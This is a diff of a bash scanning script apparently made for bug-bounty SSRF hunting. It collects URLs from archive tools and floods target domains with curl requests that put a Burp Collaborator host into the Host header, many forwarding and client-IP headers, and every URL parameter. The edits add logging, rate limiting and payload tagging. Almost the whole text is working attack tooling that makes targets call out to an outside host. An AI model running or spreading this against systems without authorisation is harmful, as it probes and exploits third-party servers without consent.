@@ -41,7 +41,7 @@ inject_host_header() {
     # Send the HTTP GET request using curl (background) with additional headers
     curl -H "Host: $Collab"  "$domain" &> /dev/null &
     # Print the processed domain for reference (optional)
-    echo -e "${YELLOW}$current_time ${NC}- Sent request to: $domain"
+    echo -e "${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee inject_host_header.log
     # Wait for $Delay seconds before next iteration
     sleep $delay
   done < "$list"
@@ -60,9 +60,9 @@ inject_common_headers() {
 
     # Send the HTTP GET request using curl (background) with additional headers
     curl -H "From: root@$Collab" -H "User-Agent: Mozilla/5.0 root@$Collab" -H "Referer: http://$Collab/ref" -H "X-Original-URL: http://$Collab/" -H "X-Wap-Profile: http://$Collab/wap.xml" -H "Profile: http://$Collab/wap.xml" -H "X-Arbitrary: http://$Collab/" -H "X-HTTP-DestinationURL: http://$Collab/" -H "X-Forwarded-Proto: http://$Collab/" -H "Origin: http://$Collab/" -H "X-Forwarded-Host: $Collab" -H "X-Host: $Collab" -H "Proxy-Host: $Collab" -H "Destination: $Collab" -H "Proxy: http://$Collab/" -H "X-Forwarded-For: $Collab" -H "Contact: root@$Collab" -H "Forwarded: for=spoofed.$Collab;by=spoofed.$Collab;host=spoofed.$Collab" -H "X-Client-IP: $Collab" -H "Client-IP: $Collab" -H "True-Client-IP: $Collab" -H "CF-Connecting_IP: $Collab" -H "X-Originating-IP: $Collab" -H "X-Real-IP: $Collab" "$domain" &> /dev/null &    # Print the processed domain for reference (optional)
-    echo -e "${YELLOW}$current_time ${NC}- Sent request to: $domain"
+    echo -e "${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee inject_common_headers.log
     # Wait for $Delay seconds before next iteration
-    #sleep $delay
+    sleep $delay
   done < "$list"
   echo -e "${GREEN}✅ Injecting Burp Collaborator into common headers ${YELLOW}Finished ${NC}"
 
@@ -72,6 +72,7 @@ inject_common_headers() {
 handle_e_option() {
   cat $list | awk -F'[://" ]+' '{print $2}' | sort -u > domains.txt
   main_Domain=$(grep -o '[^./]*\.[^./]*$' domains.txt | sort -u)
+  rm domains.txt
   # Call the main function
   inject_url_parameters "$main_Domain"
 }
@@ -80,10 +81,13 @@ handle_e_option() {
 inject_url_parameters() {
   echo -e "${light_blue}[*] Gathering URLs from $main_Domain...${NC}"
   printf $main_Domain | gau --subs --o gau.output --blacklist ttf,woff,svg,png,gif,jpeg,css,js && echo -e "${GREEN}[*] Extracted URLs from gau${NC}"
-  cat domains.txt | waybackurls > waybackurls.output && echo -e "${GREEN}[*] Extracted URLs from waybackurls${NC}"
+  #cat domains.txt | waybackurls > waybackurls.output && echo -e "${GREEN}[*] Extracted URLs from waybackurls${NC}"
   waymore -i $main_Domain -mode U -oU waymore.output -nd > /dev/null && echo -e "${GREEN}[*] Extracted URLs from waymore${NC}"
-  cat gau.output waybackurls.output waymore.output | grep "=" > all_urls
-  cat all_urls | uro -b jpg png js pdf css jpeg gif svg ttf woff > parms.txt && echo -e "${GREEN}[*]Collecting Parms ${YELLOW}finished${NC}"
+  cat gau.output waymore.output > all_urls.log
+  rm gau.output waymore.output
+  cat all_urls.log | grep "=" > all_params
+  cat all_params | uro -b jpg png js pdf css jpeg gif svg ttf woff > filtered_params.txt && echo -e "${GREEN}[*]Collecting Parms ${YELLOW}finished${NC}"
+  echo "">>filtered_params.txt
 
   echo -e "${light_blue}[*] injecting Burp Collaborator into parameters...${NC}"
   # Loop through each URL in the file
@@ -104,14 +108,14 @@ inject_url_parameters() {
     key=$(echo "$param" | cut -d'=' -f1)
     value=$(echo "$param" | cut -d'=' -f2)
     # Construct new URL with the parameter injected
-    new_url="$base_url?$(echo "$url" | grep -oP '(?<=\?).*' | sed "s|$key=$value|$key=http://$Collab|")"
+    new_url="$base_url?$(echo "$url" | grep -oP '(?<=\?).*' | sed "s|$key=$value|$key=http://$Collab/?vulnerable_url=$base_url%26vulnerable_param=$key|")"
     # Send the request
     curl -L "$new_url" &> /dev/null &
     current_time=$(date +"%H:%M:%S")
-    echo -e "${YELLOW}$current_time ${NC}- Sent request to: $new_url"
+    echo -e "${YELLOW}$current_time ${NC}- Sent request to: $new_url" | tee inject_url_parameters.log
     sleep $delay
   done
-  done < "parms.txt"
+  done < "filtered_params.txt"
   echo -e "${GREEN}✅ Injecting Burp Collaborator into parameters ${YELLOW}Finished ${NC}"
 }
 
@@ -142,5 +146,4 @@ for stage in "${stages[@]}"; do
     parameters) handle_e_option ;;
   esac
 done
-
 
